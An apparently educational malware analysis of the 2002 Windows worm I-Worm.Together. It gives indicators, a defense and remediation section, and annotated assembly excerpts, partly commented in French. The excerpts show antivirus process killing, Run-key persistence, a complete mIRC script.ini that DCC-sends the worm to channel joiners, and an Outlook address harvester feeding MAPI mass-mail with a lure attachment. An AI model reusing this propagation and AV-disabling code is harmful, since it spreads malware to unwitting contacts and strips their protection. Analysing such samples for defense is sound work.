# Dissecting I‑Worm.Together: AV‑Killer, mIRC + MAPI Spreader, and VBScript Helper 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Together (March 2002) is a 32‑bit Windows worm written in assembly. It installs itself as `%System%\\EBASE64.EXE`, persists via an HKLM Run value, attempts to hide as a Win9x service process, and then chains three spreads: killing/renaming antivirus processes, dropping a mIRC `script.ini` that DCC‑sends the worm, and harvesting email addresses via a helper VBScript to then mass‑mail with Simple MAPI. The code uses straightforward Win32 APIs with strings pushed inline using helper macros from `USEFUL.INC`, plus an inline `verif` macro for substring checks.

No exploitation or packing is present; propagation relies on local chat/mail automation and permissive defaults typical of the era.

## Quick IOCs 🧭
- Files/artifacts
  - `%System%\\EBASE64.EXE` (main persistent copy)
  - `%System%\\eBase.vbs` (VBScript helper that harvests Outlook addresses)
  - `%System%\\together.ini` (concatenated addresses separated by `;` with `#` sentinel)
  - `C:\\mirc\\script.ini`, `C:\\mirc32\\script.ini`, `C:\\progra~1\\mirc\\script.ini`, `C:\\progra~1\\mirc32\\script.ini` (written if paths exist)
  - Renamed AV binaries with a nonstandard extension (extension overwritten by `"ktp."`; likely intended `.ptk`)
- Registry
  - `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Encode Base64 = %System%\\EBASE64.EXE`
- Network / Email (MAPI)
  - Subject: `Re: Answer`
  - Body: `Here for you...`
  - Displayed filename: `funny_game.exe`
  - Attachment path: current binary path (lpszPathName = `orig_worm`)
- Targeted processes (partial list)
  - `NAVAPW32.EXE`, `NAVW32.EXE`, `AVP*.EXE`, `vshwin32.exe`, `PAVSHED.EXE`, `WFINDV32.EXE`, `F-AGNT95.EXE`, `ZONEALARM.EXE`, etc.

## Section 2 – Source Code Analysis 🔬
The code includes `USEFUL.INC` for inline string macros (`@pushsz`, `@endsz`) and defines a local `PROCESSENTRY32`. A custom inline macro `verif` wraps `lstrstr` to test for substrings in executable names.

### Installation, persistance et camouflage
```asm
api GetModuleFileNameA            ; orig_worm ← chemin courant
api GetSystemDirectoryA           ; verif_worm ← %System%
@pushsz "\EBASE64.EXE"
api lstrcat

; copy_worm ← %System%\eBase64.exe (construit par blocs "aBe\" "46es" "exe.")

api lstrcmp orig_worm, verif_worm ; déjà installé ?
jz  continue_worm

api CopyFileA  (orig_worm → copy_worm)
@pushsz "Encode Base64"
@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
push 80000002h ; HKLM
api SHSetValueA                  ; Run = %System%\EBASE64.EXE
jmp end_worm
```
- Deux chemins: `verif_worm` pour comparer `%System%\\EBASE64.EXE`, `copy_worm` pour assembler `%System%\\eBase64.exe` via trois `stosd` (technique de construction de chaîne en registre). Le programme se termine après copie+Run (la persistance démarre au prochain boot), sinon poursuit si déjà installé.

- Camouflage Win9x:
```asm
@pushsz "RegisterServiceProcess"
api GetProcAddress
push 1,0
call ecx   ; RegisterServiceProcess(0,1)
```
- Effet: invisible dans la liste des tâches Win9x (sans effet sur NT/2000/XP).

### Neutralisation d’antivirus (kill+rename)
```asm
api CreateToolhelp32Snapshot
mov [uProcess.dwSize], SIZE PROCESSENTRY32
api Process32First

; Macro verif "NAVW32.EXE" etc. → lstrstr(szExeFile, "NAVW32.EXE")
; Si match:
api OpenProcess  (PROCESS_ALL_ACCESS)
api TerminateProcess

; Renommer le binaire tué: copier sous nouveau nom puis supprimer l’original
api lstrcpy new_name, ebx         ; ebx = &uProcess.szExeFile
api lstrlen new_name
sub esi,4
mov [esi], "ktp."                ; écrase l’extension (bug d’ordre)
api CopyFileA ebx → new_name
api DeleteFileA ebx
```
- Itère `Process32First/Next` sur l’instantané Toolhelp; pour chaque nom de binaire contenant une signature d’AV/pare‑feu, tente d’ouvrir et tuer le processus, puis copie le fichier sur disque sous un nom avec extension modifiée et supprime l’original.
- Quirks:
  - `ProcessID` n’est pas alimenté; le test d’auto‑exclusion `cmp eax,[uProcess.th32ProcessID]` ne compare pas le PID courant → l’auto‑filtrage est inefficace.
  - `mov [esi],"ktp."` écrit les 4 octets `k t p .` et non `. p t k` (endianness) → l’extension résultante est anormale; intention probable: `.ptk`.

### Propagation via mIRC (script.ini)
```asm
push offset copy_worm
push offset mirc_exe
api lstrcpy        ; copie attendue: mirc_exe ← copy_worm (ordre discutable)

@mirc:
  db "C:\mirc\script.ini",0
  db "C:\mirc32\script.ini",0
  db "C:\progra~1\mirc\script.ini",0
  db "C:\progra~1\mirc32\script.ini",0

; Pour chaque chemin:
api CreateFileA (W)
api WriteFile (e_mirc - s_mirc)
```
- Le bloc `s_mirc` contient:
```asm
[script]
;Don't edit this file.
n0=on 1:JOIN:{
 n1= /if ( $nick == $me ) { halt }
 n2= /.dcc send $nick <PATH>
 n3=}
```
- `<PATH>` repose sur le tampon `mirc_exe` inséré au milieu de la zone de données. Le `lstrcpy` précédent semble inverser les paramètres (selon convention stdcall), risquant d’écrire dans `copy_worm` à partir d’un buffer vide → script probablement invalide sans correctif. L’intention: DCC envoyer `%System%\eBase64.exe` à chaque nouvel arrivant sur un canal.

### VBScript helper + MAPI mass‑mail
```asm
; Écriture %System%\eBase.vbs
api GetSystemDirectoryA → vbs_worm
@pushsz "\eBase.vbs"
api lstrcat
api CreateFileA/WriteFile s_vbs..e_vbs
api ShellExecuteA open vbs_worm     ; exécute WSH

; Attente de connectivité
verif_inet:
  api InternetGetConnectedState
  dec eax
  jnz verif_inet

; Lecture %System%\together.ini (créé par le VBS)
api CreateFileA/Mapping/MapViewOfFile
; Scanner des emails séparés par ';' et terminés par '#'
; mail_addr ← accumulateur avec contrainte d’un '@'
call send_mail  ; MAPISendMail(Message)
```
- Le VBScript `eBase.vbs`:
  - Collecte les adresses à partir de l’Outlook Object Model, les concatène séparées par `;` et termine par `#`, puis les écrit dans `%System%\together.ini`.
  - Nécessite Outlook installé et autorisations OOM (les versions post‑2000 déclenchent des invites sécurité).
- MAPI:
  - `Message` renseigne sujet `Re: Answer`, corps `Here for you...`.
  - `Attach` utilise `orig_worm` pour `lpszPathName` et `filename = "funny_game.exe"` pour le nom affiché.

## Macros and helpers from `USEFUL.INC` 🧩
- `@pushsz "text"`: inline NUL‑terminated string via call/pop trick, avoiding extra `.data` symbols.
- `@endsz`: advance a pointer to the next NUL (used while iterating mIRC path strings).
- The `push ... ; api Foo` style follows stdcall; pervasive inline strings keep the flow compact but readable.
- Local macro `verif name`: wraps `lstrstr` to factorize targeted process‑name checks.

## Defense and remediation 🛡️
- Autoruns and files
  - Remove `HKLM\...\Run\Encode Base64`; delete `%System%\EBASE64.EXE`, `%System%\eBase.vbs`, `%System%\together.ini`.
  - Inspect/remove `script.ini` in mIRC paths; restore from backups.
  - Hunt for renamed AV binaries (unusual extensions on recently modified `Program Files\...\*.exe`).
- Outlook / OOM / MAPI
  - Enforce the Object Model Guard (prompts) and block executable attachments.
  - Monitor `MAPISendMail` calls from non‑mail clients.
- Behavioral detections
  - Toolhelp32Snapshot + Process32First/Next followed by OpenProcess/TerminateProcess targeting AV executables.
  - Rapid creation of `%System%\eBase.vbs` followed by `ShellExecute`; memory‑mapping `%System%\together.ini`.
  - `InternetGetConnectedState` polling loop in a non‑browser process.
- Hardening
  - Run as standard user; apply allow‑listing (block writes under `%System%`/`Windows`).
  - Disable WSH for unmanaged users; control mIRC/IRC via policy/endpoint monitoring.

## Technical notes (bugs/edges) 🧪
- `ProcessID` is uninitialized: self‑exclusion likely ineffective.
- `"ktp."` extension overwrite (endianness): results in a non‑`.ptk` extension; odd target paths.
- `lstrcpy` in `Spread_Mirc`: parameter order likely wrong; risk of incomplete `script.ini` or missing path injection.
- Outlook dependency: without Outlook or with strict OOM guard, the email propagation chain fails.

## Conclusion
Together assembles early‑2000s techniques: Run‑key persistence, Win9x hiding, basic AV neutralization via `TerminateProcess` and on‑disk rename, IRC propagation via `script.ini`, and email spread via a VBS harvester plus MAPI. `USEFUL.INC` macros keep strings inline and API calls concise, making the binary compact yet straightforward to analyze. Modern controls (least privilege, locked‑down OOM/MAPI, constrained WSH, allow‑listing, behavioral EDR) largely neutralize this profile. For investigation, the IOCs above and behaviors (process snapshot + kills, eBase.vbs write → together.ini map) provide reliable anchors.
